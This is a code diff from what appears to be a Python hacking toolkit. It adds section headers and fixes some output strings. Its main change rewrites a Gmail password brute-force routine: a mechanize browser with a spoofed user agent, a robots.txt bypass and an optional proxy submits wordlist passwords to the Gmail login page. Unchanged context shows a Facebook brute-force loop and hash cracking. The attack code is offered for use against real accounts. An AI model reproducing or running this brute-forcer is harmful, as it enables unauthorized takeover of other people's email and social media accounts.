@@ -147,6 +147,9 @@ def Main():
 	gr.add_option("-u","--update",action="store_true",dest="update",default=False)
 	(options,args) = parse.parse_args()
 	try:
+
+################################################################# Networking Sections #################################################################
+
                 if options.wifi:
                     try:
                        import subprocess
@@ -261,7 +264,7 @@ def Main():
 							elif z.ttl==56:
 								print("\n[*]:TargetIP: %s <:\n[>]This Target belongs to [ Mac family ]"% targetip)
 							else:
-								print("\n[!]:Unknown OS ---> [ %s"%(targetip)+" ]")
+								print("\n[!]:Unknown OS ---> [ %s ]"%(targetip))
 				OS_Detection()
 			elif check4 == False:
 				print("\n[!]Ops: Your Not Connected to the internet!\n[*]Please Connect to the internet and try again :)")
@@ -430,6 +433,8 @@ def Main():
 				print("\n[!]Ops: Your Not Connected to the internet!\n[*]Please Connect to the internet and try again :)")
 				exit()
 
+################################################################# Hasing Sections #################################################################
+
 		elif options.MD5H !=None:
 		        try:
 			   import hashlib
@@ -504,6 +509,8 @@ def Main():
 			      exit()
 
 
+############################################################## Brute Force Attack Section ############################################################
+
 		elif options.FBtaremail !=None and options.wlist !=None:
 			user = options.FBtaremail
 			passw = options.wlist
@@ -520,7 +527,7 @@ def Main():
 					 except:
 					 	print("\n[!]>["+passw+"]< File Not Found !")
 						exit()
-		 			 print("\n[*]:website: [ www.facebook.com ]")
+		 			 print("\n[*]:Website: [ www.facebook.com ]")
 		 		         time.sleep(1)
 		 			 print("\n[+]:Target Email: [ "+str(user)+" ]")
 		 		         time.sleep(1.2)
@@ -550,7 +557,7 @@ def Main():
 					   			        print ("\n[*]Found! Password is ==> "+ password)
 									exit()
 								     else:
-					    			          print ('[!]Trying password:[%s--[%s '%(lo,password))
+					    			          print('[!]:Trying Password[%s] : '%(lo) + password)
 									  lo +=1
 
 				    			          except KeyboardInterrupt:
@@ -567,43 +574,67 @@ def Main():
 			 global check8
 			 if check8 ==True:
 			                 try:
-					    import smtplib
+					    import cookielib,mechanize
 					 except:
-				               print("\n[!]the [ smtplib ] is Not Found!\n[*]Warning this option needs [ smtplib ] to work!.")
+					       print("\n[!]the [ mechanize lib ] is Not Found\n[*]Please Run Installer.sh to install all Requirements needs.")
 					       exit()
-				         rs = 1
-					 ss = smtplib.SMTP("smtp.gmail.com", 587)
-					 ss.ehlo()
-					 ss.starttls()
-					 target = options.GMtaremail
-					 passwordlist = options.wlist2
+					 email = options.GMtaremail
+					 pwd_file = options.wlist2
 					 try:
-					    passwords = open(passwordlist, "r")
+					    list = open(pwd_file, "r")
+					    passwords = list.readlines()
 					 except:
-					       print("\n[!]the [ "+passwordlist+" ] File Not Found!")
+					       print("\n[!]the [ "+pwd_file+" ] File Not Found!")
 					       exit()
-		 			 print("\n\n[*]:website: [ www.gmail.com ]")
+		 			 print("\n\n[*]:Website: [ www.gmail.com ]")
 		 		         time.sleep(1)
-		 			 print("\n[+]:Target Email: [ "+str(target)+" ]")
+		 			 print("\n[+]:Target Email: [ "+str(email)+" ]")
 		 		         time.sleep(1.2)
-		 			 print("\n[@]:Wordlist: [ "+str(passwordlist)+" ]")
+		 			 print("\n[@]:Wordlist: [ "+str(pwd_file)+" ]")
 		 			 time.sleep(1)
 		 			 print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
 		 			 time.sleep(1.1)
 		 			 print("\n[$]Brute Force Attack Start[$]\n")
 		  		   	 time.sleep(0.8)
-					 for password in passwords:
-							          try:
-								     ss.login(target , password)
-								     print ("\n\n[*]Found! Password is ==> "+str(password))
-								     break;
-								  except smtplib.SMTPAuthenticationError:
-									    print ('[!]Trying password:[%s--[%s '%(rs,password))
-									    rs +=1
+					 def start(password):
+    							    br.addheaders =[('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+    							    br.open('http://www.gmail.com')
+    							    br.select_form(nr=0)
+    							    br['Email']=email
+    							    br.submit()
+    							    br.select_form(nr=0)
+    							    print('[!]:Trying Password[%s] : '%(rs) + password)
+    							    br['Passwd'] = password
+    							    br.submit()
+   	 						    if br.geturl()=='https://mail.google.com/mail/u/0/':
+        								print('\n[*]Found! Password is ==> ' + password +"\n")
+        								sys.exit(0)
+    							    else:
+        				 			 return
 
+
+				         br = mechanize.Browser()
+					 br.set_handle_robots(False)
+					 br.set_cookiejar(cookielib.LWPCookieJar())
+					 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+					 #br.set_proxies({'https':'175.45.57.11:8080'})     #uncomment the line to use proxy
+					 rs = 1
+				         try:
+					    for i in range(len(passwords)):
+    					 	passwords[i] = passwords[i].strip()
+    					 	passwords[i] = passwords[i].replace('\n','')
+
+					    for password in passwords:
+    					        start(password)
+					        rs +=1
+					 except KeyboardInterrupt:
+							print("\n[!]Stoping Attack......")
+							time.sleep(2)
+							exit()
 			 elif check8 == False:
 				print("\n[!]Ops: Your Not Connected to the internet!\n[*]Please Connect to the internet and try again :)")
 				exit()
+
 		elif options.MD5HASH !=None and options.wlist3 !=None:
 			try:
 			   import md5
